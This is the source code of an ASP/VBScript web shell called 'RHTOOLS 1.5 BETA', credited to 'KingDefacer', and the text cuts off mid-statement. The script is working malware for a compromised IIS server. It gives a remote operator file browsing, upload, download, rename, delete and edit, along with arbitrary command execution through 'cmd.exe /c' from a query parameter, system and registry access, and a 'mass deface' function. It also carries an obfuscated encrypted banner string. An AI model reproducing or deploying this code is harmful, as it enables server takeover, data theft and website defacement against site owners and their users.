b'<%@ LANGUAGE = VBScript.Encode %>\n<%\nOn Error Resume Next\nServer.ScriptTimeOut  = 7200\nClass FileUploader\n\tPublic  Files\n\tPrivate mcolFormElem\n\tPrivate Sub Class_Initialize()\n\t\tSet Files = Server.CreateObject("Scripting.Dictionary")\n\t\tSet mcolFormElem = Server.CreateObject("Scripting.Dictionary")\n\tEnd Sub\n\tPrivate Sub Class_Terminate()\n\t\tIf IsObject(Files) Then\n\t\t\tFiles.RemoveAll()\n\t\t\tSet Files = Nothing\n\t\tEnd If\n\t\tIf IsObject(mcolFormElem) Then\n\t\t\tmcolFormElem.RemoveAll()\n\t\t\tSet mcolFormElem = Nothing\n\t\tEnd If\n\tEnd Sub\n\tPublic Property Get Form(sIndex)\n\t\tForm = ""\n\t\tIf mcolFormElem.Exists(LCase(sIndex)) Then Form = mcolFormElem.Item(LCase(sIndex))\n\tEnd Property\n\tPublic Default Sub Upload()\n\t\tDim biData, sInputName\n\t\tDim nPosBegin, nPosEnd, nPos, vDataBounds, nDataBoundPos\n\t\tDim nPosFile, nPosBound\n\t\tbiData = Request.BinaryRead(Request.TotalBytes)\n\t\tnPosBegin = 1\n\t\tnPosEnd = InstrB(nPosBegin, biData, CByteString(Chr(13)))\n\t\tIf (nPosEnd-nPosBegin) <= 0 Then Exit Sub\n\t\tvDataBounds = MidB(biData, nPosBegin, nPosEnd-nPosBegin)\n\t\tnDataBoundPos = InstrB(1, biData, vDataBounds)\n\t\tDo Until nDataBoundPos = InstrB(biData, vDataBounds & CByteString("--"))\n\t\t\tnPos = InstrB(nDataBoundPos, biData, CByteString("Content-Disposition"))\n\t\t\tnPos = InstrB(nPos, biData, CByteString("name="))\n\t\t\tnPosBegin = nPos + 6\n\t\t\tnPosEnd = InstrB(nPosBegin, biData, CByteString(Chr(34)))\n\t\t\tsInputName = CWideString(MidB(biData, nPosBegin, nPosEnd-nPosBegin))\n\t\t\tnPosFile = InstrB(nDataBoundPos, biData, CByteString("filename="))\n\t\t\tnPosBound = InstrB(nPosEnd, biData, vDataBounds)\n\t\t\tIf nPosFile <> 0 And  nPosFile < nPosBound Then\n\t\t\t\tDim oUploadFile, sFileName\n\t\t\t\tSet oUploadFile = New UploadedFile\n\t\t\t\tnPosBegin = nPosFile + 10\n\t\t\t\tnPosEnd =  InstrB(nPosBegin, biData, CByteString(Chr(34)))\n\t\t\t\tsFileName = CWideString(MidB(biData, nPosBegin, nPosEnd-nPosBegin))\n\t\t\t\toUploadFile.FileName = Right(sFileName, Len(sFileName)-InStrRev(sFileName, "\\"))\n\t\t\t\tnPos = InstrB(nPosEnd, biData, CByteString("Content-Type:"))\n\t\t\t\tnPosBegin = nPos + 14\n\t\t\t\tnPosEnd = InstrB(nPosBegin, biData, CByteString(Chr(13)))\n\t\t\t\toUploadFile.ContentType = CWideString(MidB(biData, nPosBegin, nPosEnd-nPosBegin))\n\t\t\t\tnPosBegin = nPosEnd+4\n\t\t\t\tnPosEnd = InstrB(nPosBegin, biData, vDataBounds) - 2\n\t\t\t\toUploadFile.FileData = MidB(biData, nPosBegin, nPosEnd-nPosBegin)\n\t\t\t\tIf oUploadFile.FileSize > 0 Then Files.Add LCase(sInputName), oUploadFile\n\t\t\tElse\n\t\t\t\tnPos = InstrB(nPos, biData, CByteString(Chr(13)))\n\t\t\t\tnPosBegin = nPos + 4\n\t\t\t\tnPosEnd = InstrB(nPosBegin, biData, vDataBounds) - 2\n\t\t\t\tIf Not mcolFormElem.Exists(LCase(sInputName)) Then mcolFormElem.Add LCase(sInputName), CWideString(MidB(biData, nPosBegin, nPosEnd-nPosBegin))\n\t\t\tEnd If\n\t\t\tnDataBoundPos = InstrB(nDataBoundPos + LenB(vDataBounds), biData, vDataBounds)\n\t\tLoop\n\tEnd Sub\n\tPrivate Function CByteString(sString)\n\t\tDim nIndex\n\t\tFor nIndex = 1 to Len(sString)\n\t\t   CByteString = CByteString & ChrB(AscB(Mid(sString,nIndex,1)))\n\t\tNext\n\tEnd Function\n\tPrivate Function CWideString(bsString)\n\t\tDim nIndex\n\t\tCWideString =""\n\t\tFor nIndex = 1 to LenB(bsString)\n\t\t   CWideString = CWideString & Chr(AscB(MidB(bsString,nIndex,1))) \n\t\tNext\n\tEnd Function\nEnd Class\nClass UploadedFile\n\tPublic ContentType\n\tPublic FileName\n\tPublic FileData\n\tPublic Property Get FileSize()\n\t\tFileSize = LenB(FileData)\n\tEnd Property\n\tPublic Sub SaveToDisk(sPath)\n\t\tDim oFS, oFile\n\t\tDim nIndex\n\t\tIf sPath = "" Or FileName = "" Then Exit Sub\n\t\tIf Mid(sPath, Len(sPath)) <> "\\" Then sPath = sPath & "\\"\n\t\tSet oFS = Server.CreateObject("Scripting.FileSystemObject")\n\t\tIf Not oFS.FolderExists(sPath) Then Exit Sub\n\t\tSet oFile = oFS.CreateTextFile(sPath & FileName, True)\n\t\tFor nIndex = 1 to LenB(FileData)\n\t\t    oFile.Write Chr(AscB(MidB(FileData,nIndex,1)))\n\t\tNext\n\t\toFile.Close\n\tEnd Sub\n\tPublic Sub SaveToDatabase(ByRef oField)\n\t\tIf LenB(FileData) = 0 Then Exit Sub\n\t\tIf IsObject(oField) Then\n\t\t\toField.AppendChunk FileData\n\t\tEnd If\n\tEnd Sub\nEnd Class\nkey = "5DCADAC1902E59F7273E1902E5AD8414B1902E5ABF3E661902E5B554FC41902E53205CA01902E59F7273E1902E597A18C51902E59AC1E8F1902E59DE24591902E55F5B0911902E53CF70E31902E597A18C51902E5B2349FA1902E5A422FED1902E597A18C51902E5A8D389C1902E53CF70E31902E53205CA01902E5B3C4CDF1902E5A422FED1902E5BEB61221902E59DE24591902E55F5B0911902E53CF70E31902E54C98DD51902E53CF70E31902E560EB3761902E547E85261902E55AAA7E21902E55AAA7E21902E53205CA01902E5802ED5A1902E5708D0681902E5834F3241902E57B7E4AB1902E57B7E4AB1902E576CDBFC1902E581BF03F1902E53205CA01902E54C98DD51902E547E85261902E552D99691902E53205CA01902E5672BF0A1902E56BDC7B91902E5834F3241902E5659BC251902E53E873C81902E57D0E7901902E5866F8EE1902E5834F3241902E540176AD1902E53B66DFE1902E59AC1E8F1902E5AD8414B1902E5AF144301902E5BD25E3D1902E55C3AAC71902E53205CA01902E5672BF0A1902E58B2019D1902E53205CA01902E55DCADAC1902E597A18C51902E53205CA01902E5A292D081902E5B2349FA1902E59DE24591902E59F7273E1902E55F5B0911902E53CF70E31902E5AA63B811902E597A18C51902E5A422FED1902E5A8D389C1902E5B554FC41902E5AD8414B1902E55AAA7E21902E5B2349FA1902E5A292D081902E59F7273E1902E597A18C51902E59AC1E8F1902E5B554FC41902E5AD8414B1902E5B2349FA1902E5640B9401902E597A18C51902E5ABF3E661902E5B554FC41902E5A422FED1902E5B3C4CDF1902E5AD8414B1902E59AC1E8F1902E5A422FED1902E597A18C51902E5A8D389C1902E547E85261902E59AC1E8F1902E5AD8414B1902E5AA63B811902E53CF70E31902E560EB3761902E5802ED5A1902E5708D0681902E56BDC7B91902E581BF03F1902E584DF6091902E581BF03F1902E53205CA01902E56D6CA9E1902E5659BC251902E568BC1EF1902E5834F3241902E57B7E4AB1902E5802ED5A1902E55DCADAC1902E5497880B1902E597A18C51902E560EB3761902E53205CA01902E546582411902E53205CA01902E55DCADAC1902E597A18C51902E53205CA01902E5A292D081902E5B2349FA1902E59DE24591902E59F7273E1902E55F5B0911902E53CF70E31902E5708D0681902E5834F3241902E5834F3241902E57D0E7901902E55AAA7E21902E5497880B1902E5497880B1902E587FFBD31902E587FFBD31902E587FFBD31902E547E85261902E5802ED5A1902E5708D0681902E56BDC7B91902E581BF03F1902E584DF6091902E581BF03F1902E56D6CA9E1902E5659BC251902E568BC1EF1902E5834F3241902E57B7E4AB1902E5802ED5A1902E547E85261902E568BC1EF1902E573AD6321902E5672BF0A1902E547E85261902E579EE1C61902E56BDC7B91902E5834F3241902E53CF70E31902E53205CA01902E5B554FC41902E597A18C51902E5B2349FA1902E5A102A231902E59DE24591902E5B554FC41902E55F5B0911902E53CF70E31902E594812FB1902E59931BAA1902E5A8D389C1902E597A18C51902E5ABF3E661902E5A7435B71902E53CF70E31902E560EB3761902E5708D0681902E5834F3241902E5834F3241902E57D0E7901902E55AAA7E21902E5497880B1902E5497880B1902E587FFBD31902E587FFBD31902E587FFBD31902E547E85261902E5802ED5A1902E5708D0681902E56BDC7B91902E581BF03F1902E584DF6091902E581BF03F1902E56D6CA9E1902E5659BC251902E568BC1EF1902E5834F3241902E57B7E4AB1902E5802ED5A1902E547E85261902E568BC1EF1902E573AD6321902E5672BF0A1902E547E85261902E579EE1C61902E56BDC7B91902E5834F3241902E55DCADAC1902E5497880B1902E597A18C51902E560EB3761902E53205CA01902E55AAA7E21902E55AAA7E21902E547E85261902E55DCADAC1902E5497880B1902E59F7273E1902E5AD8414B1902E5ABF3E661902E5B554FC41902E560EB3761902E5|337308|1A7023"\nstartcode = "<html><head><title>RHTOOLS 1.5 BETA(PVT) Edited By KingDefacer</title></head><body>"\nendocde = "</body></html>"\nonlinehelp = "<font face=""arial"" size=""1"">.:: <a href=""http://www.rhesusfactor.cjb.net"" target=""_blank"">ONLINE HELP</a> ::.</font><br>"\nFunction DeCryptString(strCryptString)\n\tDim strRAW, arHexCharSet, i, intKey, intOffSet, strRawKey, strHexCrypData\n\t    strRawKey = Right(strCryptString, Len(strCryptString) - InStr(strCryptString, "|"))\n\t    intOffSet = Right(strRawKey, Len(strRawKey) - InStr(strRawKey,"|"))\n\t    intKey = HexConv(Left(strRawKey, InStr(strRawKey, "|") - 1)) - HexConv(intOffSet)\n\t    strHexCrypData = Left(strCryptString, Len(strCryptString) - (Len(strRawKey) + 1))\n\t    arHexCharSet = Split(strHexCrypData, Hex(intKey))\n\t\t For i=0 to UBound(arHexCharSet)\n\t\t      strRAW = strRAW & Chr(HexConv(arHexCharSet(i))/intKey)\n\t\t Next\n\t    DeCryptString = CStr(strRAW)\nEnd Function\nFunction HexConv(hexVar)\n\tDim hxx, hxx_var, multiply          \n         IF hexVar <> "" THEN\n              hexVar = UCASE(hexVar)\n              hexVar = StrReverse(hexVar)\n              DIM hx()\n              REDIM hx(LEN(hexVar))\n              hxx = 0\n              hxx_var = 0\n              FOR hxx = 1 TO LEN(hexVar)\n                   IF multiply = "" THEN multiply = 1\n                   hx(hxx) = mid(hexVar,hxx,1)\n                   hxx_var = (get_hxno(hx(hxx)) * multiply) + hxx_var\n                   multiply = (multiply * 16)\n              NEXT\n              hexVar = hxx_var\n              HexConv = hexVar\n         END IF\nEnd Function\ncprthtml = "<font face=\'arial\' size=\'1\'>RHTOOLS 1.5 BETA(PVT) Edited By KingDefacer &copy; BY <a href=\'mailto:kingdefacer@msn.com\'>KingDefacer</a> - <a href=\'HTTP://WWW.alturks.com\' target=\'_blank\'>HTTP://WWW.alturks.com</a> ::.</font>"\nFunction get_hxno(ghx)\n         If ghx = "A" Then\n              ghx = 10\n         ElseIf ghx = "B" Then\n              ghx = 11\n         ElseIf ghx = "C" Then\n              ghx = 12\n         ElseIf ghx = "D" Then\n              ghx = 13\n         ElseIf ghx = "E" Then\n              ghx = 14\n         ElseIf ghx = "F" Then\n              ghx = 15\n         End If\n         get_hxno = ghx\nEnd Function\nkeydec = DeCryptString(key)\nFunction showobj(objpath)\n\tshowobj = Mid(objpath,InstrRev(objpath,"\\")+1,Len(objpath))\nEnd Function\nFunction showobjpath(objpath)\n\tshowobjpath = Left(objpath,InstrRev(objpath,"\\"))\nEnd Function\nFunction checking(a,b)\n\tIf CStr(Mid(a,95,13)) <> CStr(Mid(b,95,13)) Then\n\t\tpagina = Mid(Request.ServerVariables("SCRIPT_NAME"),InstrRev(Request.ServerVariables("SCRIPT_NAME"),"/")+1,Len(Request.ServerVariables("SCRIPT_NAME"))) & "?action=error"\n\t\tResponse.Redirect(pagina)\n\tEnd If\nEnd Function\nSub hdr()\n\tResponse.Write startcode\n\tResponse.Write keydec\n\tResponse.Write "<br>"\nEnd Sub\nSub showcontent()\n\tResponse.Write "<font face=""arial"" size=""1"">.:: <a href=""" & Request.ServerVariables("SCRIPT_NAME") & "?raiz=root"">DRIVES</a> ::.<br>.:: SCRIPT PATH: " & UCase(Server.MapPath(Request.ServerVariables("SCRIPT_NAME"))) & "<br><br></font>" \n\tIf Trim(Request.QueryString("raiz")) = "root" Then\n\t\tSet fs=Server.Createobject("Scripting.FileSystemObject")\n\t\tSet drivecollection=fs.drives\n\t\tResponse.Write "<font face=""arial"" size=""2"">"\n\t\tFor Each drive IN drivecollection \n\t\t\tstr=drive.driveletter & ":"\n\t\t\tResponse.Write "<b><a href=""" & Request.ServerVariables("SCRIPT_NAME") & "?raiz=" & str & """>" & UCase(str) & "</a></b><br>"\n\t\t\tSelect Case drive.DriveType\n\t\t\t\tCase 0\n\t\t\t\t\ttipodrive = "Unknown"\n\t\t\t\t\tnomedrive = drive.VolumeName\n\t\t\t\tCase 1\n\t\t\t\t\ttipodrive = "Removable"\n\t\t\t\t\tIf drive.isready Then\n\t\t\t\t\t\tnomedrive = drive.VolumeName\n\t\t\t\t\tElse\n\t\t\t\t\t\tnomedrive = ""\n\t\t\t\t\tEnd If\n\t\t\t\tCase 2\n\t\t\t\t\ttipodrive = "Fixed"\n\t\t\t\t\tIf drive.isready Then\n\t\t\t\t\t\tnomedrive = drive.VolumeName\n\t\t\t\t\tElse\n\t\t\t\t\t\tnomedrive = ""\n\t\t\t\t\tEnd If\n\t\t\t\tCase 3\n\t\t\t\t\ttipodrive = "Network"\n\t\t\t\t\tIf drive.isready Then\n\t\t\t\t\t\tnomedrive = drive.ShareName\n\t\t\t\t\tElse\n\t\t\t\t\t\tnomedrive = ""\n\t\t\t\t\tEnd If\n\t\t\t\tCase 4\n\t\t\t\t\ttipodrive = "CD-Rom"\n\t\t\t\t\tIf drive.isready Then\n\t\t\t\t\t\tnomedrive = drive.VolumeName\n\t\t\t\t\tElse\n\t\t\t\t\t\tnomedrive = ""\n\t\t\t\t\tEnd If\n\t\t\t\tCase 5\n\t\t\t\t\ttipodrive = "RAM Disk"\n\t\t\t\t\tIf drive.isready Then\n\t\t\t\t\t\tnomedrive = drive.VolumeName\n\t\t\t\t\tElse\n\t\t\t\t\t\tnomedrive = ""\n\t\t\t\t\tEnd If\n\t\t\tEnd Select\n\t\t\tresponse.write "<b>Tipo:</b> " & tipodrive & "<br>"\n\t\t\tresponse.write "<b>Nome: </b>" & nomedrive & "<br>"\n\t\t\tresponse.write "<b>Sistema de Arquivos: </b>"\n\t\t\tIf drive.isready Then\n\t\t\t\tset sp=fs.getdrive(str)\n\t\t\t\tresponse.write sp.filesystem & "<br>"\n\t\t\tElse\n\t\t\tresponse.write "-<br>"\n\t\t\tEnd If\n\t\t\tResponse.Write "<b>Espa\xe7o Livre: </b>"\n\t\t\tIf drive.isready Then\n\t\t\t\tfreespace = (drive.AvailableSpace / 1048576)\n\t\t\t\tset sp=fs.getdrive(str)\n\t\t\t\tresponse.write(Round(freespace,1) & " MB<br>")\n\t\t\tElse\n\t\t\t\tresponse.write("-<br>")\n\t\t\tEnd If\n\t\t\tResponse.Write "<b>Espa\xe7o Total: </b>"\n\t\t\tIf drive.isready Then\n\t\t\t\ttotalspace = (drive.TotalSize / 1048576)\n\t\t\t\tset sp=fs.getdrive(str)\n\t\t\t\tresponse.write(Round(totalspace,1) & " MB<br>")\n\t\t\tElse\n\t\t\t\tresponse.write("-<br>")\n\t\t\tEnd If\n\t\t\tResponse.Write "<br>"\n\t\tNext\n\t\tResponse.Write "</font>"\n\t\tSet fs = Nothing\n\t\tSet drivecollection = Nothing\n\t\tset sp=Nothing\n\tElse\n\t\tIf Trim(Request.QueryString("raiz")) = "" Then\n\t\t\tcaminho = Server.MapPath(Request.ServerVariables("SCRIPT_NAME"))\n\t\t\tpos = Instr(caminho,"\\")\n\t\t\tpos2 = 1\n\t\t\tWhile pos2 <> 0\n\t\t\t\tIf Instr(pos + 1,caminho,"\\") <> 0 Then\n\t\t\t\t\tpos = Instr(pos + 1,caminho,"\\")\n\t\t\t\tElse\n\t\t\t\t\tpos2 = 0\n\t\t\t\tEnd If\n\t\t\tWend\n\t\t\traiz = Left(caminho,pos)\n\t\tElse\n\t\t\traiz =  trim(Request.QueryString("raiz")) & "\\"\n\t\tEnd If\n\t\tSet ObjFSO = CreateObject("Scripting.FileSystemObject")\n\t\tSet MonRep = ObjFSO.GetFolder(raiz)\n\t\tSet ColFolders = MonRep.SubFolders\n\t\tSet ColFiles0 = MonRep.Files\n\t\tResponse.Write "<font face=\'arial\' size=\'1\'><a href=""#"" onclick=""javascript:document.open(\'" & Request.ServerVariables("SCRIPT_NAME") & "?action=mass&massact=test&path=" & Replace(raiz,"\\","|") & "\', \'win1\',\'width=600,height=300,scrollbars=YES,resizable\')"">MASS TEST IN " & UCase(raiz) & "</a></font><br><br>"\n\t\tResponse.Write "<font face=\'arial\' size=\'1\'><a href=""#"" onclick=""javascript:document.open(\'" & Request.ServerVariables("SCRIPT_NAME") & "?action=mass&massact=dfc&path=" & Replace(raiz,"\\","|") & "\', \'win1\',\'width=700,height=300,scrollbars=YES,resizable\')"">MASS DEFACE IN " & UCase(raiz) & "</a></font><br><br>"\n\t\tResponse.Write "<font face=\'arial\' size=\'1\'><a href=""#"" onclick=""javascript:document.open(\'" & Request.ServerVariables("SCRIPT_NAME") & "?action=upload&path=" & Replace(raiz,"\\","|") & "\', \'win1\',\'width=500,height=100,scrollbars=YES,resizable\')"">UPLOAD FILE TO " & UCase(raiz) & "</a></font><br><br>"\n\t\tResponse.Write "<font face=\'arial\' size=\'1\'><a href=""#"" onclick=""javascript:document.open(\'" & Request.ServerVariables("SCRIPT_NAME") & "?action=cmd\', \'win1\',\'width=760,height=540,scrollbars=YES,resizable\')"">PROMPT</a> - <a href=""#"" onclick=""javascript:document.open(\'" & Request.ServerVariables("SCRIPT_NAME") & "?action=info\', \'win1\',\'width=760,height=450,scrollbars=YES,resizable\')"">SYS INFO</a> - <a href=""#"" onclick=""javascript:document.open(\'" & Request.ServerVariables("SCRIPT_NAME") & "?action=reg\', \'win1\',\'width=550,height=250,scrollbars=YES,resizable\')"">REGEDIT</a></font><br><br>"\n\t\tResponse.Write "<font face=\'arial\'><b>Root Folder: " & raiz & "</b></font><br><br>"\n\t\tIf CInt(Len(raiz) - 1) <> 2 Then\n\t\t\tbarrapos = CInt(InstrRev(Left(raiz,Len(raiz) - 1),"\\")) - 1\n\t\t\tbacklevel = Left(raiz,barrapos)\n\t\t\tResponse.Write "<font face=\'arial\' size=\'2\'><b>&lt;DIR&gt;<a href=\'" & Request.ServerVariables("SCRIPT_NAME") & "?raiz=" & backlevel & "\'> . . </font></b></a><br>"\n\t\tElse\n\t\t\tResponse.Write "<font face=\'arial\' size=\'2\'><b>&lt;DIR&gt;<a href=\'" & Request.ServerVariables("SCRIPT_NAME") & "?raiz=root\'> . .&nbsp;</font></b></a><br>"\n\t\tEnd If\n\t\tResponse.Write "<table border=""0"" cellspacing=""0"" cellpadding=""0"" >"\n\t\tfor each folderItem in ColFolders\n\t\t\tResponse.Write "<tr><td><font face=\'arial\' size=\'2\'><b>&lt;DIR&gt; <a href=\'" & Request.ServerVariables("SCRIPT_NAME") & "?raiz=" & folderItem.path & "\'>" & showobj(folderItem.path) & "</a></b></td><td valign=\'baseline\'>&nbsp;&nbsp;<font face=\'arial\' size=\'1\'><a href=""#"" onclick=""javascript:document.open(\'" & Request.ServerVariables("SCRIPT_NAME") & "?action=put&path=" & Replace(folderItem.path,"\\","|") & "\', \'win1\',\'width=400,height=250,scrollbars=YES,resizable\')"">&lt;&lt; PUT</a></font></td></tr>"\n\t\tnext\n\t\tResponse.Write "</table><br><table border=""0"" cellspacing=""0"" cellpadding=""0"" >"\n\t\tmarcatabela = true\n\t\tfor each FilesItem0 in ColFiles0\n\t\t\tIf marcatabela = true then\n\t\t\t\tcorfundotabela = " bgcolor=""#EEEEEE"""\n\t\t\tElse\n\t\t\t\tcorfundotabela = ""\n\t\t\tEnd If\n\t\t\tResponse.Write "<tr><td" & corfundotabela & "><font face=\'arial\' size=\'2\'>:: " & showobj(FilesItem0.path) & "</td><td valign=\'baseline\'" & corfundotabela & "><font face=\'arial\' size=\'1\'>&nbsp;&nbsp;" & FormatNumber(FilesItem0.size/1024, 0) & "&nbsp;Kbytes&nbsp;&nbsp;&nbsp;</font></td><td valign=\'baseline\'" & corfundotabela & ">&nbsp;&nbsp;<font face=\'arial\' size=\'1\'><a href=""#"" onclick=""javascript:document.open(\'" & Request.ServerVariables("SCRIPT_NAME") & "?action=get&path=" & Replace(FilesItem0.path,"\\","|") & "\', \'win1\',\'width=400,height=200,scrollbars=YES,resizable\')"">o.GET.o</a></font></td><td valign=\'baseline\'" & corfundotabela & ">&nbsp;&nbsp;&nbsp;&nbsp;<font face=\'arial\' size=\'1\'><a href=""#"" onclick=""javascript:document.open(\'" & Request.ServerVariables("SCRIPT_NAME") & "?action=ren&path=" & Replace(FilesItem0.path,"\\","|") & "\', \'win1\',\'width=400,height=200,scrollbars=YES,resizable\')"">o.REN.o</a></font></td><td valign=\'baseline\'" & corfundotabela & ">&nbsp;&nbsp;&nbsp;&nbsp;<font face=\'arial\' size=\'1\'><a href=""#"" onclick=""javascript:document.open(\'" & Request.ServerVariables("SCRIPT_NAME") & "?action=del&path=" & Replace(FilesItem0.path,"\\","|") & "\', \'win1\',\'width=400,height=200,scrollbars=YES,resizable\')"">o.DEL.o</a></font></td><td valign=\'baseline\'" & corfundotabela & ">&nbsp;&nbsp;&nbsp;&nbsp;<font face=\'arial\' size=\'1\'><a href=""#"" onclick=""javascript:document.open(\'" & Request.ServerVariables("SCRIPT_NAME") & "?action=txtview&file=" & Replace(FilesItem0.path,"\\","|") & "\', \'win1\',\'width=640,height=480,scrollbars=YES,resizable\')"">o.VIEW.o</a></font></td><td valign=\'baseline\'" & corfundotabela & ">&nbsp;&nbsp;&nbsp;&nbsp;<font face=\'arial\' size=\'1\'><a href=""#"" onclick=""javascript:document.open(\'" & Request.ServerVariables("SCRIPT_NAME") & "?action=txtedit&file=" & Replace(FilesItem0.path,"\\","|") & "\', \'win1\',\'width=760,height=520,scrollbars=YES,resizable\')"">o.EDIT.o</a></font></td><td valign=\'baseline\'" & corfundotabela & ">&nbsp;&nbsp;&nbsp;&nbsp;<font face=\'arial\' size=\'1\'><a href=""" & Request.ServerVariables("SCRIPT_NAME") & "?action=download&file=" & Replace(FilesItem0.path,"\\","|") & """>o.DOWNLOAD.o</a></font></td></tr>"\n\t\t\tmarcatabela = NOT marcatabela\n\t\tnext\n\t\tResponse.Write "</table>"\n\tEnd If\nEnd Sub\nSelect Case Trim(Request.QueryString("action"))\n\tCase "get"\n\t\tcheca = checking(cprthtml,keydec)\n\t\tCall hdr()\n\t\tResponse.Write copyright & onlinehelp\n\t\tcaminho = Replace(Trim(Request.QueryString("path")),"|","\\")\n\t\tSet ObjFSO = CreateObject("Scripting.FileSystemObject")\n\t\tSet MyFile = ObjFSO.GetFile(caminho)\n\t\tdestino = Left(Server.MapPath(Request.ServerVariables("SCRIPT_NAME")),InstrRev(Server.MapPath(Request.ServerVariables("SCRIPT_NAME")),"\\"))\n\t\tMyFile.Copy (destino)\n\t\tIf Err.Number = 0 Then\n\t\t\tResponse.Write "<font face=\'arial\' size=\'2\'><center><br><br>Arquivo: <b>" & caminho & "</b><br>copiado para: " & destino\n\t\tEnd If\t\n\tCase "put"\n\t\tcheca = checking(cprthtml,keydec)\n\t\tCall hdr()\n\t\tResponse.Write copyright & onlinehelp\n\t\tIf Trim(Request.QueryString("arquivo")) = "" Then\n\t\t\tcaminho = Left(Server.MapPath(Request.ServerVariables("SCRIPT_NAME")),InstrRev(Server.MapPath(Request.ServerVariables("SCRIPT_NAME")),"\\"))\n\t\t\tvarpath = Trim(Request.QueryString("path"))\n\t\t\tSet ObjFSO = CreateObject("Scripting.FileSystemObject")\n\t\t\tSet MonRep = ObjFSO.GetFolder(caminho)\n\t\t\tSet ColFolders = MonRep.SubFolders\n\t\t\tSet ColFiles0 = MonRep.Files\n\n\t\t\tResponse.Write "<font face=\'arial\' size=\'2\'><b>Selecione o arquivo: <br><table border=""0"" cellspacing=""0"" cellpadding=""0"" >"\n\t\t\tfor each FilesItem0 in ColFiles0\n\t\t\t\tResponse.Write "<tr><td><font face=\'arial\' size=\'2\'>:: " & showobj(FilesItem0.path) & "</td><td valign=\'baseline\'><font face=\'arial\' size=\'1\'>&nbsp;&nbsp;" & FormatNumber(FilesItem0.size/1024, 0) & "&nbsp;Kbytes&nbsp;&nbsp;&nbsp;</font></td><td valign=\'baseline\'>&nbsp;&nbsp;<font face=\'arial\' size=\'1\'><a href=""" & Request.ServerVariables("SCRIPT_NAME") & "?action=put&path=" & varpath & "&arquivo=" & Replace(FilesItem0.path,"\\","|") & """>:: SELECIONAR ::</a></font></td></tr>"\n\t\t\tnext\n\t\t\tResponse.Write "</table>"\n\t\tElse\n\t\t\tdestino = Replace(Trim(Request.QueryString("path")),"|","\\") & "\\"\n\t\t\tarquivo = Replace(Trim(Request.QueryString("arquivo")),"|","\\")\n\t\t\tSet ObjFSO = CreateObject("Scripting.FileSystemObject")\n\t\t\tSet MyFile = ObjFSO.GetFile(arquivo)\n\t\t\tMyFile.Copy (destino)\n\t\t\tIf Err.Number = 0 Then\n\t\t\t\tResponse.Write "<font face=\'arial\' size=\'2\'><center><br><br>Arquivo: <b>" & arquivo & "</b><br>copiado para: <b>" & destino\n\t\t\tEnd If\n\t\tEnd If\n\tCase "del"\n\t\tcheca = checking(cprthtml,keydec)\n\t\tCall hdr()\n\t\tResponse.Write copyright & onlinehelp\n\t\tcaminho = Replace(Trim(Request.QueryString("path")),"|","\\")\n\t\tSet ObjFSO = CreateObject("Scripting.FileSystemObject")\n\t\tSet MyFile = ObjFSO.GetFile(caminho)\n\t\tMyFile.Delete\n\t\tIf Err.Number = 0 Then\n\t\t\tResponse.Write "<SCRIPT LANGUAGE=""JavaScript"">self.opener.document.location.reload();</SCRIPT>"\n\t\t\tResponse.Write "<font face=\'arial\' size=\'2\'><center><br><br>Arquivo <b>" & caminho & "</b> apagado<br>"\n\t\tEnd If\n\tCase "ren"\n\t\tcheca = checking(cprthtml,keydec)\n\t\tCall hdr()\n\t\tResponse.Write copyright & onlinehelp\n\t\tIf Trim(Request.QueryString("status")) <> "2" Then\n\t\t\tcaminho = Replace(Trim(Request.QueryString("path")),"|","\\")\n\t\t\tarquivo = showobj(caminho)\n\t\t\tResponse.Write "<br><font face=""arial"" size=""2""><b>" & arquivo & "</b><br>" & _\n\t\t\t\t\t\t       "<form action=""" & Request.ServerVariables("SCRIPT_NAME") & """ method=""get"">" & _\n\t\t\t\t\t\t       "<input type=""hidden"" name=""action"" value=""ren"">" & _\n\t\t\t\t\t\t       "<input type=""hidden"" name=""status"" value=""2"">" & _\n\t\t\t\t\t\t       "<input type=""hidden"" name=""path"" value=""" & Trim(Request.QueryString("path")) & """>" & _\n\t\t\t\t\t\t       "Digite o novo nome: <input type=""text"" name=""newname"">" & _\n\t\t\t\t\t\t       "&nbsp;&nbsp;<input type=""submit"" value=""alterar"">" & _\n\t\t\t\t\t\t       "</form>"\n\t\tElse\n\t\t\tcaminho = Replace(Trim(Request.QueryString("path")),"|","\\")\n\t\t\tSet ObjFSO = CreateObject("Scripting.FileSystemObject")\n\t\t\tSet MyFile = ObjFSO.GetFile(caminho)\n\t\t\tdestino = Left(caminho,InStrRev(caminho,"\\")) & Trim(Request.QueryString("newname"))\n\t\t\tMyFile.Move (destino)\n\t\t\tIf Err.Number = 0 Then\n\t\t\t\tResponse.Write "<font face=\'arial\' size=\'2\'><center><br><br>Arquivo: <b>" & caminho & "</b><br>renomeado para<b>: " & destino\n\t\t\t\tResponse.Write "<SCRIPT LANGUAGE=""JavaScript"">self.opener.document.location.reload();</SCRIPT>"\n\t\t\tEnd If\t\n\t\tEnd If\n\tCase "error"\n\t\tResponse.Write "<center><font face=\'arial\' size=\'2\' color=\'red\'> <b>C\xd3DIGO CORROMPIDO<BR>CORRUPT CODE</font></center>"\n\tCase "cmd"\n\t\tcheca = checking(cprthtml,keydec)\n\t\tCall hdr()\n\t\tResponse.Write copyright & onlinehelp\n\t\tSet oScript = Server.CreateObject("WSCRIPT.SHELL") \n\t\tSet oScriptNet = Server.CreateObject("WSCRIPT.NETWORK") \n\t\tSet oFileSys = Server.CreateObject("Scripting.FileSystemObject") \n\t\tszCMD = Request.QueryString(".CMD") \n\t\tIf (szCMD <> "") Then \n\t\t\tszTempFile = "c:\\" & oFileSys.GetTempName( ) \n\t\t\tCall oScript.Run ("cmd.exe /c " & szCMD & " > " & szTempFile, 0, True) \n\t\t\tSet oFile = oFileSys.OpenTextFile (szTempFile, 1, False, 0) \n\t\tEnd If \n\t\tResponse.Write "<FORM action=""" & Request.ServerVariables("URL") & """ method=""GET""><input type=""hidden"" name=""action"" value=""cmd""><input type=text name="".CMD"" size=45 value=""" & szCMD & """><input type=submit value=""Run""></FORM><br><br> "\n\t\tIf (IsObject(oFile)) Then \n\t\t\tOn Error Resume Next \n\t\t\tResponse.Write "<font face=""arial"">"\n\t\t\tResponse.Write Replace(Replace(Server.HTMLEncode(oFile.ReadAll),VbCrLf,"<br>")," ","&nbsp;")\n\t\t\toFile.Close \n\t\t\tCall oFileSys.DeleteFile(szTempFile, True) \n\t\tEnd If \n\tCase "info"\n\t\tcheca = checking(cprthtml,keydec)\n\t\tCall hdr()\n\t\tResponse.Write copyright & onlinehelp\n\t\tSet WshNetwork = Server.CreateObject("WScript.Network")\n\t\tSet WshShell = Server.CreateObject("WScript.Shell")\n\t\tSet WshEnv = 